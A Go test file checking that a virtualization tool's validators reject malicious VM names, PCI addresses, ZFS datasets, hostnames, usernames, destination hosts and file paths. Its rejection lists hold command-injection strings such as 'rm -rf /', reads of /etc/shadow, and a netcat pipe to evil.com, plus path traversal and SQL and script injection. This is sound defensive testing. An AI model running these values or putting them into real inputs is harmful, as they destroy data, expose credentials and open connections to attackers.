package main

import (
	"testing"
)

func TestValidateVMName(t *testing.T) {
	valid := []string{"my-vm", "test_vm", "ubuntu.22.04", "VM123", "a", "web-server-1"}
	invalid := []string{
		"", "vm; rm -rf /", "vm$(whoami)", "vm`id`", "vm\nmalicious",
		"vm|cat /etc/shadow", "vm && evil", "-dashstart", "../../../etc",
		"vm<script>", "vm' OR '1'='1", "vm\x00null",
	}

	for _, name := range valid {
		if err := validateVMName(name); err != nil {
			t.Errorf("validateVMName(%q) should be valid: %v", name, err)
		}
	}
	for _, name := range invalid {
		if err := validateVMName(name); err == nil {
			t.Errorf("validateVMName(%q) should be REJECTED but was accepted", name)
		}
	}
	t.Logf("Tested %d valid + %d invalid VM names", len(valid), len(invalid))
}

func TestValidatePCIAddress(t *testing.T) {
	valid := []string{"01:00.0", "0000:01:00.0", "10:1a.3", "00:1f.6", "0000:00:02.0"}
	invalid := []string{
		"", "not-a-pci-addr", "1:0.0", "01:00", "01:00.0; rm -rf /",
		"$(evil)", "01:00.0 > /tmp/x", "01:00.0\nmalicious",
	}

	for _, addr := range valid {
		if err := validatePCIAddress(addr); err != nil {
			t.Errorf("validatePCIAddress(%q) should be valid: %v", addr, err)
		}
	}
	for _, addr := range invalid {
		if err := validatePCIAddress(addr); err == nil {
			t.Errorf("validatePCIAddress(%q) should be REJECTED", addr)
		}
	}
	t.Logf("Tested %d valid + %d invalid PCI addresses", len(valid), len(invalid))
}

func TestValidateZFSDatasetName(t *testing.T) {
	valid := []string{"mypool", "mypool/dataset", "mypool/dataset@snap1", "tank/vms/ubuntu"}
	invalid := []string{
		"", "pool; rm -rf /", "pool$(evil)", "pool`cmd`",
		"pool/../other", "pool\nmalicious", "-dashstart",
		"pool | evil", "pool && rm",
	}

	for _, name := range valid {
		if err := validateZFSDatasetName(name); err != nil {
			t.Errorf("validateZFSDatasetName(%q) should be valid: %v", name, err)
		}
	}
	for _, name := range invalid {
		if err := validateZFSDatasetName(name); err == nil {
			t.Errorf("validateZFSDatasetName(%q) should be REJECTED", name)
		}
	}
	t.Logf("Tested %d valid + %d invalid ZFS names", len(valid), len(invalid))
}

func TestValidateHostname(t *testing.T) {
	valid := []string{"webserver", "web-server-01", "k8s-master"}
	invalid := []string{
		"", "-hostname", "hostname-", "host;name", "host_name",
		"host\nname", "host$(evil)", "host name",
	}

	for _, h := range valid {
		if err := validateHostname(h); err != nil {
			t.Errorf("validateHostname(%q) should be valid: %v", h, err)
		}
	}
	for _, h := range invalid {
		if err := validateHostname(h); err == nil {
			t.Errorf("validateHostname(%q) should be REJECTED", h)
		}
	}
}

func TestValidateCloudInitUsername(t *testing.T) {
	valid := []string{"ubuntu", "admin_user", "user1"}
	invalid := []string{
		"", "1username", "user;name", "user$(evil)", "user name",
		"user\n", "user-name",
	}

	for _, u := range valid {
		if err := validateCloudInitUsername(u); err != nil {
			t.Errorf("validateCloudInitUsername(%q) should be valid: %v", u, err)
		}
	}
	for _, u := range invalid {
		if err := validateCloudInitUsername(u); err == nil {
			t.Errorf("validateCloudInitUsername(%q) should be REJECTED", u)
		}
	}
}

func TestValidateDestHost(t *testing.T) {
	valid := []string{"192.168.1.10", "server.example.com", "node1", "10.0.0.1"}
	invalid := []string{
		"", "host; rm -rf /", "$(evil)", "host`cmd`", "host\nmalicious",
		"host | nc evil.com 4444",
	}

	for _, h := range valid {
		if err := validateDestHost(h); err != nil {
			t.Errorf("validateDestHost(%q) should be valid: %v", h, err)
		}
	}
	for _, h := range invalid {
		if err := validateDestHost(h); err == nil {
			t.Errorf("validateDestHost(%q) should be REJECTED", h)
		}
	}
}

func TestValidateFilePath(t *testing.T) {
	// Valid within allowed dir
	if err := validateFilePath("/var/lib/libvirt/images/ubuntu.qcow2", "/var/lib/libvirt/images"); err != nil {
		t.Errorf("valid path rejected: %v", err)
	}
	// Invalid: relative path
	if err := validateFilePath("relative/path", "/var/lib/libvirt/images"); err == nil {
		t.Error("relative path should be rejected")
	}
	// Invalid: path traversal
	if err := validateFilePath("/var/lib/libvirt/images/../../../etc/shadow", "/var/lib/libvirt/images"); err == nil {
		t.Error("path traversal should be rejected")
	}
	// Invalid: outside allowed dir
	if err := validateFilePath("/etc/passwd", "/var/lib/libvirt/images"); err == nil {
		t.Error("path outside allowed dir should be rejected")
	}
	t.Log("All file path validation tests passed")
}
